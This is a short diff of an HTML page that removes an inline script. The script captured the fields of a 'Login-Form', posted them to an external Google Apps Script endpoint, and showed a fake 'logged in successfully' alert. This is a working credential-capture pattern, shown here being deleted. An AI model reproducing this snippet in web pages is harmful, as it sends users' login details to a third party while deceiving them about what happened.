@@ -44,18 +44,7 @@
     </div>
 
     <script src="script.js" async defer></script>
-    <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbzCWTPJq2VkGDBUK6XPnVQBx-K57NYe9dUa7-VLxGEUfAgJ3gVsxRjXOF7wgu0Wnhth/exec'
-        const form = document.forms['Login-Form']
 
-        form.addEventListener('submit', e => {
-            e.preventDefault()
-            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
-                .then(response => alert("Thank you! you Logged in successfully."))
-                .then(() => { window.location.reload(); })
-                .catch(error => console.error('Error!', error.message))
-        })
-    </script>
 </body>
 
 </html>
